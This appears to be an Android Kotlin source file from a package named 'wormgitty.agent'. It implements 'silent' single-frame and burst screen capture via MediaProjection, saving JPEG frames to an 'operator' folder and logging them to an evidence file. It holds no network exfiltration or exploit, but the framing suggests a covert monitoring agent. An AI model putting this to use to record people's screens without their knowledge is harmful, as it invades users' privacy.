package com.wormgitty.agent

import android.content.Context
import android.hardware.display.DisplayManager
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Handler
import android.os.HandlerThread
import android.util.Log
import java.io.File

/**
 * Silent single-frame + burst screen capture through MediaProjection.
 * Burst cadence: one frame every PERIOD_MS for BURST_COUNT frames (= 60s).
 */
class ScreenCapture(private val context: Context) {

    data class FrameSpec(val periodMs: Long, val count: Int) {
        val totalMs: Long get() = periodMs * count
        companion object {
            val STANDARD = FrameSpec(periodMs = 5000L, count = 12)
        }
    }

    fun screenDir(): File =
        File(File(context.filesDir, "operator"), "screen").apply { if (!exists()) mkdirs() }

    fun frameFile(ts: Long, seq: Int): File =
        File(screenDir(), "cap_${ts}_${seq}.jpg")

    fun projectionManager(): MediaProjectionManager =
        context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

    /** Pure, test-covered: cadence verifier (5s x 12 = 60s). */
    fun verifyCadence(spec: FrameSpec): Boolean =
        spec.periodMs in 1..60_000 && spec.count in 1..600 &&
            spec.totalMs >= spec.periodMs * (spec.count - 1)

    fun createProjection(resultCode: Int, data: android.content.Intent): MediaProjection =
        projectionManager().getMediaProjection(resultCode, data)

    /**
     * Captures exactly ONE frame into cap_{ts}_{seq}.jpg using the projection.
     * Blocks until image or timeout; closes everything afterwards.
     */
    fun grabOnce(projection: MediaProjection, seq: Int, ts: Long): File? {
        var thread: HandlerThread? = null
        var reader: ImageReader? = null
        var vDisplay: android.hardware.display.VirtualDisplay? = null
        return try {
            val metrics = context.resources.displayMetrics
            val width = metrics.widthPixels.coerceAtLeast(64)
            val height = metrics.heightPixels.coerceAtLeast(64)
            val density = metrics.densityDpi.coerceAtLeast(120)

            val t = HandlerThread("screen-grab").apply { start() }
            thread = t
            val handler = Handler(t.looper)
            // RGBA_8888 is the only format VirtualDisplay can render into; a
            // JPEG reader fed RGBA frames aborts natively inside getPlanes()
            // (SIGABRT in libmedia_jni — uncatchable). We compress ourselves.
            val ir = ImageReader.newInstance(
                width, height, android.graphics.PixelFormat.RGBA_8888, 2
            )
            reader = ir
            val latch = java.util.concurrent.CountDownLatch(1)
            val holder = arrayOfNulls<File>(1)

            ir.setOnImageAvailableListener({ r ->
                var img: android.media.Image? = null
                try {
                    img = r.acquireLatestImage()
                    if (img != null) {
                        val plane = img.planes[0]
                        val rowPad = plane.rowStride - plane.pixelStride * width
                        val full = android.graphics.Bitmap.createBitmap(
                            width + rowPad / plane.pixelStride, height,
                            android.graphics.Bitmap.Config.ARGB_8888
                        )
                        full.copyPixelsFromBuffer(plane.buffer)
                        val bmp = android.graphics.Bitmap.createBitmap(full, 0, 0, width, height)
                        full.recycle()
                        val f = frameFile(ts, seq)
                        f.outputStream().use {
                            bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 90, it)
                        }
                        bmp.recycle()
                        holder[0] = f
                    }
                } catch (t: Throwable) {
                    // Listener crosses a JNI boundary: any escape is a native abort.
                    Log.e("ScreenCapture", "Error", t)
                } finally {
                    runCatching { img?.close() }
                    latch.countDown()
                }
            }, handler)

            vDisplay = projection.createVirtualDisplay(
                "wg_screen", width, height, density,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                ir.surface, null, handler
            )
            val completed = latch.await(ScreenTimeouts.SINGLE_S, java.util.concurrent.TimeUnit.SECONDS)
            if (completed) holder[0] else null
        } catch (e: Exception) {
            Log.e("ScreenCapture", "Error", e)
            null
        } finally {
            runCatching { vDisplay?.release() }
            runCatching { reader?.close() }
            thread?.quitSafely()
        }
    }

    /**
     * Burst: [spec.count] grabs spaced [spec.periodMs]; survivors recorded, each
     * pause honours interrupt. Returns the written files.
     */
    fun burst(
        projection: MediaProjection,
        spec: FrameSpec = FrameSpec.STANDARD,
        stopFlag: (() -> Boolean)? = null
    ): List<File> {
        val written = mutableListOf<File>()
        val ts = System.currentTimeMillis()
        for (i in 1..spec.count) {
            if (stopFlag?.invoke() == true) break
            grabOnce(projection, i, ts)?.let(written::add)
            if (i < spec.count) {
                try { Thread.sleep(spec.periodMs) } catch (_: InterruptedException) { break }
            }
        }
        return written
    }

    object ScreenTimeouts { const val SINGLE_S = 10L }
}

/** Process-lifetime projection holder: single consent ask per process run. */
object LiveProjectionHolder {
    @Volatile
    var liveProjection: android.media.projection.MediaProjection? = null
    @Volatile
    var grantedAtMs: Long = 0L
}

/** Evidence-writing helper (file-backed, formats the burst cadence). */
object ScreenCaptureEv {
    fun burstEvidence(singlePath: String, paths: List<String>, spec: ScreenCapture.FrameSpec): String =
        buildString {
            append("SCREEN_SINGLE ${singlePath}\n")
            append("SCREEN_BURST count=${paths.size} period_ms=${spec.periodMs} total_ms=${spec.totalMs}\n")
            paths.forEach { append("FRAME $it\n") }
        }
}

fun MainActivity.appendEvidence(text: String) {
    val dir = java.io.File(filesDir, "operator").apply { if (!exists()) mkdirs() }
    java.io.File(dir, "evidence.txt").appendText(text)
}
